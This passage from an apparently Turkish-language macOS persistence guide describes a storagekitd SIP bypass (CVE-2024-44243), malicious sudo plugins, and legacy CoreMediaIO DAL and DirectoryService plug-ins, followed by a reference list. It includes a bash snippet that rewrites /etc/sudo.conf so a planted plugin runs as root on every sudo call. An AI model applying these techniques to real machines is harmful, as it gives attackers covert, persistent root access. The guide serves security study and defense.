Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Sandbox bypass için kullanışlı: [🔴](https://emojipedia.org/large-red-circle) (root gerekir)
- Root gerekir; sonuç **SIP'yi bypass eder**. Etkilenen macOS sürümleri **15.0–15.1**, düzeltme **15.2** sürümünde

#### Konum

- **`/Library/Filesystems/`** içine bir filesystem bundle bırakın.

#### Açıklama ve Exploitation

`storagekitd`, **`com.apple.rootless.install.heritable`** entitlement'ına sahiptir ve filesystem bundle'ların ikililerini bu SIP-bypass yeteneği **devralınmış** olarak başlatır. Kötü amaçlı bir filesystem bundle yerleştiren saldırgan, **kalıcı kernel extensions** yüklemek veya SIP korumalı `LaunchDaemon` dizinlerine yazmak için SIP bypass ile kod çalıştırabilir; bu kalıcılık normal korumalara rağmen varlığını sürdürür ve onları aşar.<sup>[[46]](#references)</sup> Apple bu sorunu macOS Sequoia 15.2'de düzeltti.

### sudo plugins (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Sandbox bypass için kullanışlı: [🔴](https://emojipedia.org/large-red-circle) (`/etc/sudo.conf` dosyasına yazmak için root gerekir)
- Kurulum için root gerekir; ardından plugin **her `sudo` çağrısında** çalışır (setuid-root bağlamında)

#### Konum

- **`/etc/sudo.conf`** — `Plugin` satırları, **`/usr/libexec/sudo/`** içindeki (veya mutlak bir yoldaki) shared object'leri yükler. Varsayılan olarak mevcut değildir (sudo yerleşik bir policy kullanır), bu nedenle dosyayı oluşturmak temiz bir hook sağlar.

#### Açıklama ve Exploitation

`sudo`, policy/approval/audit plugin'lerini `/etc/sudo.conf` dosyasından yükler. `sudo` setuid-root olduğundan, kötü amaçlı bir shared-object plugin'i herhangi bir kullanıcı `sudo` çalıştırdığında **root privileges** ile çalışır; bu, her sudo komutunu da gören kalıcı bir root persistence sağlar.<sup>[[51]](#references)</sup> macOS, plugin API'sini destekleyen sudo 1.9.x sürümünü içerir.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

Yazı: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Minimal örnek: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Eski mekanizma:** macOS 12.3'ten itibaren kullanımdan kaldırılmıştır. macOS 14.1 ve sonraki sürümlerde eski video plug-in'leri varsayılan olarak devre dışıdır. Bu yolun çalışabilmesi için kullanıcının Recovery üzerinden eski video desteğini yeniden etkinleştirmesi gerekir; yalnızca yazılabilir bir dizinin bulunması yeterli değildir. [Apple'ın güncel destek yönergeleri](https://support.apple.com/en-us/108387).
- Plug-in dizinine yazmak için root gerekir. Herhangi bir kod yürütülmesi, DAL plug-in'lerini hâlâ yükleyen uyumlu bir istemcinin bulunmasına bağlıdır; bu, macOS 26'da çalışma zamanında test edilmemiştir.

#### Konum

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Root gerekir
  - **Tetikleyici:** Uyumlu bir kamera istemcisi, **eski destek yeniden etkinleştirildikten sonra** aygıtları listeler. İstemci kitaplığı doğrulaması üçüncü taraf bir plug-in'i engelleyebilir.

#### Açıklama ve Exploitation

CoreMediaIO **DAL** (Device Abstraction Layer) plug-in'leri bazı kamera uygulamaları tarafından aynı işlem içinde yüklenirdi. Apple'ın [kamera uzantıları sunumu](https://developer.apple.com/videos/play/wwdc2022/10022/), eski DAL plug-in'lerinin FaceTime, QuickTime Player veya Photo Booth ile **çalışmadığını** ve diğer birçok istemcinin kitaplık doğrulamasını zorunlu kıldığını özellikle belirtiyor. Modern [Core Media I/O uzantıları](https://developer.apple.com/documentation/coremediaio), ayrı bir yükleme ve onay modeliyle işlem dışında çalışır. Tarihsel işlem içi teknik, mevcut macOS'ta genel bir Camera TCC bypass olduğu anlamına gelmez.<sup>[[53]](#references)[[54]](#references)</sup>

macOS 26'da salt okunur gözlem: `/Library/CoreMediaIO/Plug-Ins/DAL` mevcut ve root'a aittir. Eski desteğin etkinleştirildiği veya herhangi bir istemcide yükleme yapıldığı doğrulanmamıştır.

### Directory Service Plug-ins

Yazı: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Eski, koşullu mekanizma:** Yükleme için root ve gerçekten yapılandırılıp yüklenen bir plug-in gerekir. DirectoryService'in plug-in API'si kullanımdan kaldırılmıştır; bunu bir boot tetikleyicisi olarak değerlendirmeden önce hedef Mac'in Open Directory yapılandırmasına bakın.

#### Konum

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Root gerekir
  - **Tetikleyici:** Open Directory ihtiyaç duyduğunda `dspluginhelperd` uygun ve yapılandırılmış bir plug-in'i yükler. [Apple'ın plug-in çalışma zamanı kılavuzu](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html), başlangıç için yapılandırılmamış plug-in'lerin düğümleri açıldığında tembel yüklenebileceğini belirtir.

#### Açıklama ve Exploitation

`dspluginhelperd`, eski DirectoryService plug-in paketlerini destekler. Eski plug-in'in kabul edilip etkinleştirildiği durumlarda kötü amaçlı bir plug-in ayrıcalıklı bir kod yürütme yolu sağlayabilir; bu yol PAM ve Authorization Plugins'ten farklıdır. Dizinin mevcut olması, yeni yazılan bir plug-in'in sonraki açılışta çalışacağını göstermez. macOS 26.5'te Apple'ın yerel `dspluginhelperd(8)` ve `opendirectoryd(8)` kılavuzları bu yardımcı programı ve eski yolu hâlâ listeliyor.<sup>[[53]](#references)</sup>

macOS 26'da salt okunur gözlem: `/Library/DirectoryServices/PlugIns` ve `/usr/libexec/dspluginhelperd` mevcut. Bu test sırasında hiçbir plug-in yüklenmedi, yapılandırılmadı veya çalıştırılmadı.

## Persistence teknikleri ve araçları

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, Infostealer yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Eski güzel LaunchAgents'ın ötesinde - 1 - shell başlangıç dosyaları](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Eski güzel LaunchAgents'ın ötesinde - 18 - X11 ve XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Eski güzel LaunchAgents'ın ötesinde - 21 - Yeniden açılan uygulamalar](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Eski güzel LaunchAgents'ın ötesinde - 20 - Terminal tercihleri](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Eski güzel LaunchAgents'ın ötesinde - 13 - Audio plug-in'leri](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-in'leri (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Eski güzel LaunchAgents'ın ötesinde - 12 - QuickLook plug-in'leri](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Eski güzel LaunchAgents'ın ötesinde - 22 - LoginHook ve LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Eski güzel LaunchAgents'ın ötesinde - 4 - cron işleri](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Eski güzel LaunchAgents'ın ötesinde - 2 - iTerm2 başlangıcı](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Eski güzel LaunchAgents'ın ötesinde - 7 - xbar plug-in'leri](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Eski güzel LaunchAgents'ın ötesinde - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Eski güzel LaunchAgents'ın ötesinde - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Eski güzel LaunchAgents'ın ötesinde - 3 - Giriş Öğeleri](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Eski güzel LaunchAgents'ın ötesinde - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Eski güzel LaunchAgents'ın ötesinde - 24 - Klasör Eylemleri](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOS'ta Persistence için Klasör Eylemleri (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Eski güzel LaunchAgents'ın ötesinde - 27 - Dock kısayolları](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Eski güzel LaunchAgents'ın ötesinde - 17 - Renk seçiciler](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Eski güzel LaunchAgents'ın ötesinde - 26 - Finder Sync plug-in'leri](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] ["Mac File Opener" Persistence'ının analizi (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Eski güzel LaunchAgents'ın ötesinde - 16 - Ekran Koruyucu](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Erişiminizi koruyun: macOS Persistence için ekran koruyucular (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Eski güzel LaunchAgents'ın ötesinde - 11 - Spotlight içe aktarıcıları](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Eski güzel LaunchAgents'ın ötesinde - 9 - Tercih Bölmesi](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Eski güzel LaunchAgents'ın ötesinde - 19 - Periyodik betikler](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Eski güzel LaunchAgents'ın ötesinde - 5 - Takılabilir Kimlik Doğrulama Modülleri (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Eski güzel LaunchAgents'ın ötesinde - 28 - Authorization plug-in'leri](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization plug-in'leriyle kalıcı kimlik bilgisi hırsızlığı (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Eski güzel LaunchAgents'ın ötesinde - 30 - man yapılandırma dosyası - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Eski güzel LaunchAgents'ın ötesinde - 25 - Apache2 modülleri](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Eski güzel LaunchAgents'ın ötesinde - 31 - BSM denetim çatısı](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Eski güzel LaunchAgents'ın ötesinde - 23 - emond, Olay İzleme Daemon'u](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Eski güzel LaunchAgents'ın ötesinde - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Eski güzel LaunchAgents'ın ötesinde - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Eski güzel LaunchAgents'ın ötesinde - 10 - Uygulama betik dosyaları](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Eski güzel LaunchAgents'ın ötesinde - 32 - Dock Tile plug-in'leri](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Eski güzel LaunchAgents'ın ötesinde - 33 - Widget'lar](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Eski güzel LaunchAgents'ın ötesinde - 34 - launchd boot görevleri](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Eski güzel LaunchAgents'ın ötesinde - 35 - NVRAM üzerinden Persistence (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [OS X'te Persistence için e-posta kullanımı (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Şüpheli Apple Mail kuralı Plist değişikliği (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Kötü amaçlı profiller - Mac'lere yönelik en ciddi tehditlerden biri (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Mac Malware Sanatı Cilt 1 - Bölüm 0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [CVE-2024-44243'ün analizi: kernel extension'lar üzerinden macOS SIP bypass (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [Claude Code Proje Dosyaları Üzerinden RCE ve API Token Sızdırma (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [GitHub Copilot ve Cursor'da yeni güvenlik açığı - Rules Dosyası Backdoor'u (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - Alternatif yükleme yöntemleri (Harici Uzantılar)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Mac'te Chrome'dan ExtensionInstallForcelist'i kaldırma (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Sudo plug-in'leri yazma üzerine (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Özel URL şemaları üzerinden uzaktan Mac Exploitation (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Plug-in'leri kötüye kullanan iki macOS Persistence yöntemi (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO DAL minimal örneği (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Spotlight tabanlı bir macOS TCC güvenlik açığının analizi (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Python `site` modülü belgeleri (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
